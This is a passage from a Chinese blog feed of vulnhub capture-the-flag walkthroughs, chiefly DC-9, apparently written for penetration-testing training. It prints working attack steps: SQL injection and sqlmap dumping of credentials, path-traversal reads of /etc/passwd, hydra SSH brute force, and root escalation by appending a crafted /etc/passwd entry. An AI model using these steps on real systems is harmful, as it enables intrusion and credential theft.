alt="image-20240113171438974"></p><p>在里面发现了id_rsa和id_rsa.pub两个文件，那么把它cp到jen目录下就可以使用ssh公匙免密登录jen了<br>将公钥复制到jen里：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> id_rsa.pub /tmp/authorized_keys<span class="token function">chmod</span> <span class="token number">777</span> /tmp/authorized_keys<span class="token function">sudo</span> <span class="token parameter variable">-u</span> jen /bin/cp /tmp/authorized_keys /home/jen/.ssh<span class="token function">ssh</span> jen@192.168.52.132<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>我们可以看到登录成功，而且有一封邮件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113171926477.png" alt="image-20240113171926477"></p><h4 id="5-获取信息，得到moss用户密码"><a href="#5-获取信息，得到moss用户密码" class="headerlink" title="5)获取信息，得到moss用户密码"></a>5)获取信息，得到moss用户密码</h4><p>我们查看邮件,进入**&#x2F;var&#x2F;mail**邮箱路径进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113172351157.png" alt="image-20240113172351157"></p><p>我们登录moss用户，我们查看权限</p><p>很可惜。moss用户无法以root权限执行任何命令</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113172558198.png" alt="image-20240113172558198"></p><p>我们查看隐藏文件，看到有一个.games</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113172952469.png" alt="image-20240113172952469"></p><p>我们进行访问，看到有一个文件是root用户</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113173047269.png" alt="image-20240113173047269"></p><p>我们进行访问，访问后发现一个root权限的二进制文件upyourgame，我们进行执行文件就获取到了root权限</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113173159899.png" alt="image-20240113173159899"></p><h4 id="6-提权到root，查看flag"><a href="#6-提权到root，查看flag" class="headerlink" title="6)提权到root，查看flag"></a>6)提权到root，查看flag</h4><p>我们执行.&#x2F;upyourgame文件，然后一直输入yes即可</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113173300213.png" alt="image-20240113173300213"></p><p>我们查看flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113173315261.png" alt="image-20240113173315261"></p><h1 id="三-相关资源"><a href="#三-相关资源" class="headerlink" title="三.相关资源"></a>三.相关资源</h1><p>1.靶场下载地址 </p><p>2.nmap</p><p>3.arp-scan </p><p>4.masscan </p><p>5.[ 常用工具篇 ] 渗透神器 whatweb 安装使用详解 </p><p>6.[ 渗透工具篇 ] EHole(棱洞)3.0安装部署及详解（linux &amp; win） </p><p>7.nikto工具的使用</p><p>8.dirsearch目录扫描</p><p>9.msfconsole工具的使用</p><p>10.crunsh和john工具的使用</p><p>11.ssh公钥</p><p>12.opennetadmin漏洞利用</p><p>13.邮箱路径&#x2F;var&#x2F;mail</p><p>14.MiniServ服务</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之DC-9</title>
    <link href="http://ms02423.top/2024/01/09/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-9/"/>
    <id>http://ms02423.top/2024/01/09/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-9/</id>
    <published>2024-01-09T06:49:10.000Z</published>
    <updated>2024-01-09T14:33:53.943Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">DC-9 <span class="token keyword">is</span> another purposely built vulnerable lab <span class="token keyword">with</span> the intent <span class="token keyword">of</span> gaining experience <span class="token keyword">in</span> the world <span class="token keyword">of</span> penetration testing<span class="token punctuation">.</span>The ultimate goal <span class="token keyword">of</span> this challenge <span class="token keyword">is</span> <span class="token keyword">to</span> get root <span class="token operator">and</span> <span class="token keyword">to</span> <span class="token keyword">read</span> the one <span class="token operator">and</span> only flag<span class="token punctuation">.</span>Linux skills <span class="token operator">and</span> familiarity <span class="token keyword">with</span> the Linux command <span class="token keyword">line</span> <span class="token keyword">are</span> a must<span class="token punctuation">,</span> <span class="token keyword">as</span> <span class="token keyword">is</span> some experience <span class="token keyword">with</span> basic penetration testing tools<span class="token punctuation">.</span><span class="token keyword">For</span> beginners<span class="token punctuation">,</span> Google can be <span class="token keyword">of</span> great assistance<span class="token punctuation">,</span> but you can always tweet me <span class="token keyword">at</span> @DCAU7 <span class="token keyword">for</span> assistance <span class="token keyword">to</span> get you going again<span class="token punctuation">.</span> But take note<span class="token punctuation">:</span> I wo<span class="token string">n't give you the answer, instead, I'</span>ll give you an idea about how <span class="token keyword">to</span> <span class="token keyword">move</span> forward<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>只有一个flag</p><h2 id="2-靶场下载地址"><a href="#2-靶场下载地址" class="headerlink" title="2.靶场下载地址"></a>2.靶场下载地址</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnhub<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token keyword">entry</span><span class="token operator">/</span>dc-9<span class="token punctuation">,</span><span class="token number">412</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109150106054.png" alt="image-20240109150106054"></p><h2 id="3-启动靶场"><a href="#3-启动靶场" class="headerlink" title="3.启动靶场"></a>3.启动靶场</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109150139977.png" alt="image-20240109150139977"></p><p>虚拟机开启之后界面如上，我们不知道ip，需要自己探活，网段知道：192.168.52.0&#x2F;24</p><h1 id="二-渗透测试"><a href="#二-渗透测试" class="headerlink" title="二.渗透测试"></a>二.渗透测试</h1><h2 id="1-目标"><a href="#1-目标" class="headerlink" title="1.目标"></a>1.目标</h2><p>目标就是我们搭建的靶场，靶场IP为：192.168.52.0&#x2F;24</p><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h2><h3 id="1-寻找靶场真实ip"><a href="#1-寻找靶场真实ip" class="headerlink" title="(1)寻找靶场真实ip"></a>(1)寻找靶场真实ip</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">nmap -sP <span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109150619965.png" alt="image-20240109150619965"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">arp-scan -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109150719519.png" alt="image-20240109150719519"></p><p>靶场的真实ip地址是192.168.52.131</p><h3 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="(2)探测端口及服务"></a>(2)探测端口及服务</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">nmap -A -v -p- <span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.131</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109151001815.png" alt="image-20240109151001815"></p><p> 注意到ssh服务端口是filtered的，可能是因为什么原因关闭了</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109151534928.png" alt="image-20240109151534928"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开放了<span class="token number">80</span>端口，APache httpd <span class="token number">2.4</span><span class="token number">.38</span><span class="token punctuation">(</span><span class="token punctuation">(</span>debian<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以使用masscan进行探测</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">masscan <span class="token parameter variable">--rate</span><span class="token operator">=</span><span class="token number">10000</span> <span class="token parameter variable">--ports</span> <span class="token number">0</span>-65535 <span class="token number">192.168</span>.52.131<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109151721992.png" alt="image-20240109151721992"></p><h3 id="3-web指纹识别"><a href="#3-web指纹识别" class="headerlink" title="(3)web指纹识别"></a>(3)web指纹识别</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">whatweb -v <span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.131</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109152351370.png" alt="image-20240109152351370"></p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="(1)访问web服务"></a>(1)访问web服务</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.131</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109152800589.png" alt="image-20240109152800589"></p><p>没有如何有用的信息</p><h3 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="(2)扫描web服务"></a>(2)扫描web服务</h3><h4 id="1-棱洞3-0指纹识别"><a href="#1-棱洞3-0指纹识别" class="headerlink" title="1)棱洞3.0指纹识别"></a>1)棱洞3.0指纹识别</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./EHole_linux_amd64 finger <span class="token parameter variable">-u</span> http://192.168.52.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109153022173.png" alt="image-20240109153022173"></p><h4 id="2-nikto扫描网站结构"><a href="#2-nikto扫描网站结构" class="headerlink" title="2)nikto扫描网站结构"></a>2)nikto扫描网站结构</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.52.131<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109153211906.png" alt="image-20240109153211906"></p><p>上面两个都没有扫描到有用的信息</p><h4 id="3-dirsearch目录扫描"><a href="#3-dirsearch目录扫描" class="headerlink" title="3)dirsearch目录扫描"></a>3)dirsearch目录扫描</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.52.131 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109153525872.png" alt="image-20240109153525872"></p><p>我们可以看到扫描到2个有用的信息，一个&#x2F;inex.php&#x2F;login,一个&#x2F;manage.php</p><p>我们分别访问</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109153727723.png" alt="image-20240109153727723"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109153741635.png" alt="image-20240109153741635"></p><p>我们可以看到是一个登录页面，看来需要我们进行登录，但是不知道用户名和密码，我们对页面进行探测</p><h3 id="3-渗透测试-1"><a href="#3-渗透测试-1" class="headerlink" title="(3)渗透测试"></a>(3)渗透测试</h3><h4 id="1-页面探测"><a href="#1-页面探测" class="headerlink" title="1)页面探测"></a>1)页面探测</h4><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109155037059.png" alt="image-20240109155037059"></p><p>我们可以看到4个页面，我们一一进行探测，最后发现search存在POST型SQL注入</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109155648721.png" alt="image-20240109155648721"></p><h4 id="2-SQL注入"><a href="#2-SQL注入" class="headerlink" title="2)SQL注入"></a>2)SQL注入</h4><p>我们进行测试</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">search<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109160220516.png" alt="image-20240109160220516"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">search<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">or</span> <span class="token number">1</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109160154425.png" alt="image-20240109160154425"></p><p>证明存在SQL注入，我们使用sqlmap进行爆破</p><p>爆破数据库</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlmap <span class="token operator">-</span>u <span class="token string">"http://192.168.52.131/results.php"</span> <span class="token comment">--level=5 --risk=3 --batch --method=POST --data='search=1'</span>sqlmap <span class="token operator">-</span>u <span class="token string">"http://192.168.52.131/results.php"</span> <span class="token comment">--level=5 --risk=3 --batch --method=POST --data='search=1' --dbs</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109164603256.png" alt="image-20240109164603256"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109164639922.png" alt="image-20240109164639922"></p><p>我们看到存在3个数据库，我们爆破 Staff</p><p>爆破表名</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlmap <span class="token operator">-</span>u <span class="token string">"http://192.168.52.131/results.php"</span> <span class="token comment">--level=5 --risk=3 --batch --method=POST --data='search=1' -D 'Staff' --tables</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109165121805.png" alt="image-20240109165121805"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109164955448.png" alt="image-20240109164955448">爆破字段名</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlmap <span class="token operator">-</span>u <span class="token string">"http://192.168.52.131/results.php"</span> <span class="token comment">--level=5 --risk=3 --batch --method=POST --data='search=1' -D 'Staff' -T 'Users' --columns</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109165142093.png" alt="image-20240109165142093"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109165200750.png" alt="image-20240109165200750"></p><p>爆破用户名和密码</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlmap <span class="token operator">-</span>u <span class="token string">"http://192.168.52.131/results.php"</span> <span class="token comment">--level=5 --risk=3 --batch --method=POST --data='search=1' -D 'Staff' -T 'Users' -C 'UserID,Username,Password' --dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109165352353.png" alt="image-20240109165352353"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109165414955.png" alt="image-20240109165414955"></p><p>我们可以看到只有一个用户名和密码，密码是md5加密的，我们进行解密即可</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109170603479.png" alt="image-20240109170603479"></p><p>密码是transorbital1</p><h4 id="3-登录后台"><a href="#3-登录后台" class="headerlink" title="3)登录后台"></a>3)登录后台</h4><p>我们接着用该密码登入后台</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109170740474.png" alt="image-20240109170740474"></p><p>就多了个Add Record界面，注意到下面有File does not exist，想到是程序引用或读取了一个不存在的文件才会回显这个，接着用参数fuzz测试一下</p><p>burpsuite抓包，构建payload</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?§§<span class="token operator">=</span><span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109204619893.png" alt="image-20240109204619893"></p><p>然后再把我们的参数字典加载进来</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109201834786.png" alt="image-20240109201834786"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109203037986.png" alt="image-20240109203037986"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109204228910.png" alt="image-20240109204228910"></p><p>参数名是file，存在目录遍历漏洞</p><h4 id="4-端口敲门服务"><a href="#4-端口敲门服务" class="headerlink" title="4)端口敲门服务"></a>4)端口敲门服务</h4><p>考虑到ssh端口是关闭的，可能是开启了knock服务（参考<a href="https://www.cnblogs.com/xiaoxiaoleo/p/8523322.html">端口敲门服务</a>），利用文件包含确认一下，一般开启了knock服务就会存在&#x2F;etc&#x2F;knockd.conf文件</p><p>构造payload</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/manage.php?file<span class="token operator">=</span><span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/etc/knockd.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109204350312.png" alt="image-20240109204350312"></p><p>果然有，开启ssh服务得依次敲击7469,8475,9842端口，利用netcat进行敲击</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-z</span> <span class="token number">192.168</span>.52.131 <span class="token number">7469</span> <span class="token number">8475</span> <span class="token number">9842</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109205447903.png" alt="image-20240109205447903"></p><p>敲击完后发现端口打开了</p><h4 id="5-ssh爆破"><a href="#5-ssh爆破" class="headerlink" title="5)ssh爆破"></a>5)ssh爆破</h4><p>我们使用ssh进行登录，发现登录不了</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109205934820.png" alt="image-20240109205934820"></p><p>想起之前SQLmap跑出过一个users的数据库， 存放网站用户信息的，我们去瞧一下</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlmap <span class="token operator">-</span>u <span class="token string">"http://192.168.52.131/results.php"</span> <span class="token comment">--level=5 --risk=3 --batch --method=POST --data='search=1' -D 'users' -dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109210151740.png" alt="image-20240109210151740"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109210218085.png" alt="image-20240109210218085"></p><p>用这些账号密码组成字典，爆破ssh</p><p>username.txt</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">marym juliedfredfbarneyrtomcjerrymwilmafbettyrchandlerbjoeytrachelgrossgmonicagphoebebscootsjanitorjanitor2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>password.txt</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">3kfs86sfd468sfdfsd24sfd87sfd1RocksOffTC<span class="token operator">&amp;</span>TheBoyzB8m#48sdPebblesBamBam01UrAG0D!Passw0rdyN72#dsdILoveRachel3248dsds7ssmellycatsYR3BVxxxw87IlovepeepeeHawaii-Five-0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来用九头蛇进行爆破</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra <span class="token parameter variable">-L</span> username.txt <span class="token parameter variable">-P</span> password.txt ssh://192.168.52.131<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109210739070.png" alt="image-20240109210739070"></p><p>爆破出来3个用户名和密码</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">chandlerb<span class="token punctuation">:</span>UrAG0D!joeyt<span class="token punctuation">:</span>Passw0rdjanitor<span class="token punctuation">:</span>Ilovepeepee<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>尝试登入发现janitor用户有东西</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109211236603.png" alt="image-20240109211236603"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109211115878.png" alt="image-20240109211115878"></p><p>有几个密码，复制到刚才的password文件继续爆破ssh</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109211616657.png" alt="image-20240109211616657"></p><p>新添加了一个用户</p><p>我们进行登录</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109211756620.png" alt="image-20240109211756620"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109212239263.png" alt="image-20240109212239263"></p><p>发现有个root权限文件</p><h4 id="6-提权"><a href="#6-提权" class="headerlink" title="6) 提权"></a>6) 提权</h4><p>发现这里有个脚本文件可以无密码以root用户权限执行，我们进入&#x2F;opt&#x2F;devstuff&#x2F;dist&#x2F;test目录下先看看有什么信息，全是文件，回到上一个目录查看，也没什么，再回到上一个目录查看，在&#x2F;opt&#x2F;devstuff目录下发现了一个test.py脚本文件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109212533285.png" alt="image-20240109212533285"></p><p>我们查看文件内容</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109212613285.png" alt="image-20240109212613285"></p><p>这是一个写入文件的脚本，生成一个密码用root权限执行脚本写入&#x2F;etc&#x2F;passwd文件，所以我们现在就需要构造一个拥有root权限的用户，并且在&#x2F;etc&#x2F;passwd文件中储存，只要使用这个用户登录后，就可以获取到root权限，事先参考<a href="https://blog.csdn.net/liukaitydn/article/details/83046083">&#x2F;etc&#x2F;passwd解释</a></p><p>先利用openssl命令创建一个密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">openssl <span class="token function">passwd</span> <span class="token parameter variable">-1</span> <span class="token parameter variable">-salt</span> <span class="token operator">&lt;</span>用户名<span class="token operator">></span> <span class="token operator">&lt;</span>密码<span class="token operator">></span>openssl <span class="token function">passwd</span> <span class="token parameter variable">-1</span> <span class="token parameter variable">-salt</span> MS02423 MS02423<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109220355343.png" alt="image-20240109220355343"></p><p>得到hash密码，</p><pre class="line-numbers language-haskell" data-language="haskell"><code class="language-haskell"><span class="token operator">$</span><span class="token number">1</span><span class="token operator">$</span><span class="token constant">MS02423</span><span class="token operator">$</span><span class="token hvariable">xCJ3D9eufDuODS1PBNjp51</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们切换到tmp目录下，新建一个文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /tmp<span class="token builtin class-name">echo</span> <span class="token string">'MS02423:$1$MS02423$xCJ3D9eufDuODS1PBNjp51:0:0::/root:/bin/bash'</span> <span class="token operator">></span> MS02423<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109220506874.png" alt="image-20240109220506874"></p><p>再回到&#x2F;opt&#x2F;devstuff&#x2F;dist&#x2F;test目录，执行程序test，将MS02423的文件内容写入到&#x2F;etc&#x2F;passwd文件里面</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /opt/devstuff/dist/test <span class="token function">sudo</span> ./test /tmp/MS02423 /etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109214004115.png" alt="image-20240109214004115"></p><p>可以看到MS02423用户已经添加到&#x2F;etc&#x2F;passwd文件里了，接下来然后使用命令su MS02423 切换到我们添加的MS02423用户，输入之前设置好密码即可登录</p><p>跳转到&#x2F;root目录下，成功看到flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240109215910411.png" alt="image-20240109215910411"></p><h1 id="三-相关资源"><a href="#三-相关资源" class="headerlink" title="三.相关资源"></a>三.相关资源</h1><p>1.靶场下载地址 </p><p>2.nmap</p><p>3.arp-scan </p><p>4.masscan </p><p>5.[ 常用工具篇 ] 渗透神器 whatweb 安装使用详解 </p><p>6.[ 渗透工具篇 ] EHole(棱洞)3.0安装部署及详解（linux &amp; win） </p><p>7.nikto工具的使用</p><p>8.burp工具的使用</p><p>9.dirsearch目录扫描</p><p>10.SQL注入</p><p>11.ssh登录</p><p>12.openssl命令</p><p>13.端口敲门服务</p><p>14.hydra爆破</p><p>15.目录遍历漏洞</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之DC-8</title>
    <link href="http://ms02423.top/2024/01/08/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-8/"/>
    <id>http://ms02423.top/2024/01/08/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-8/</id>
    <published>2024-01-08T07:00:10.000Z</published>
    <updated>2024-01-09T07:39:22.618Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">DC-8 <span class="token keyword">is</span> another purposely built vulnerable lab <span class="token keyword">with</span> the intent <span class="token keyword">of</span> gaining experience <span class="token keyword">in</span> the world <span class="token keyword">of</span> penetration testing<span class="token punctuation">.</span>This challenge <span class="token keyword">is</span> a <span class="token keyword">bit</span> <span class="token keyword">of</span> a hybrid between being an actual challenge<span class="token punctuation">,</span> <span class="token operator">and</span> being a <span class="token string">"proof of concept"</span> <span class="token keyword">as</span> <span class="token keyword">to</span> whether two-factor authentication installed <span class="token operator">and</span> configured <span class="token keyword">on</span> Linux can prevent the Linux server <span class="token keyword">from</span> being exploited<span class="token punctuation">.</span>The <span class="token string">"proof of concept"</span> portion <span class="token keyword">of</span> this challenge eventuated <span class="token keyword">as</span> a result <span class="token keyword">of</span> a question being asked about two-factor authentication <span class="token operator">and</span> Linux <span class="token keyword">on</span> Twitter<span class="token punctuation">,</span> <span class="token operator">and</span> <span class="token keyword">also</span> due <span class="token keyword">to</span> a suggestion <span class="token keyword">by</span> @theart42<span class="token punctuation">.</span>The ultimate goal <span class="token keyword">of</span> this challenge <span class="token keyword">is</span> <span class="token keyword">to</span> bypass two-factor authentication<span class="token punctuation">,</span> get root <span class="token operator">and</span> <span class="token keyword">to</span> <span class="token keyword">read</span> the one <span class="token operator">and</span> only flag<span class="token punctuation">.</span>You probably would<span class="token string">n't even know that two-factor authentication was installed and configured unless you attempt to login via SSH, but it'</span>s definitely there <span class="token operator">and</span> doing it's job<span class="token punctuation">.</span>Linux skills <span class="token operator">and</span> familiarity <span class="token keyword">with</span> the Linux command <span class="token keyword">line</span> <span class="token keyword">are</span> a must<span class="token punctuation">,</span> <span class="token keyword">as</span> <span class="token keyword">is</span> some experience <span class="token keyword">with</span> basic penetration testing tools<span class="token punctuation">.</span><span class="token keyword">For</span> beginners<span class="token punctuation">,</span> Google can be <span class="token keyword">of</span> great assistance<span class="token punctuation">,</span> but you can always tweet me <span class="token keyword">at</span> @DCAU7 <span class="token keyword">for</span> assistance <span class="token keyword">to</span> get you going again<span class="token punctuation">.</span> But take note<span class="token punctuation">:</span> I wo<span class="token string">n't give you the answer, instead, I'</span>ll give you an idea about how <span class="token keyword">to</span> <span class="token keyword">move</span> forward<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只有一个flag</p><h2 id="2-靶场下载地址"><a 